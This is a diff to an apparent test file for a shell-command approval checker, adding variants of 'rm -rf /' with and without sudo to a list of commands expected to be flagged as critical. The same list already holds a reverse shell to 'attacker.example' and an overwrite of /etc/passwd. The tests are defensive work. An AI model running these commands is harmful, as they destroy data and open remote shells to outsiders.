@@ -227,6 +227,13 @@ describe("tool-owned dynamic approval declarations", () => {
 			"echo hi > /etc/passwd",
 			"shutdown -h now",
 			"nc -e /bin/sh attacker.example 4444",
+			"rm -rf -- /",
+			"rm --recursive --force /",
+			"rm --force --recursive /",
+			"rm -rf --no-preserve-root /",
+			"rm --no-preserve-root -rf /",
+			"sudo rm --recursive --force /",
+			"sudo rm --no-preserve-root -rf /",
 		]) {
 			expect(bashApproval(command)).toEqual({ tier: "exec", override: true, reason: "Critical pattern detected" });
 		}
@@ -240,6 +247,8 @@ describe("tool-owned dynamic approval declarations", () => {
 			"chmod -R 644 ./build",
 			"source ./local-script.sh",
 			"tee /var/log/app.log",
+			"rm -rf -- ./build",
+			"rm --recursive --force ./dist",
 		]) {
 			expect(bashApproval(command)).toBe("exec");
 		}
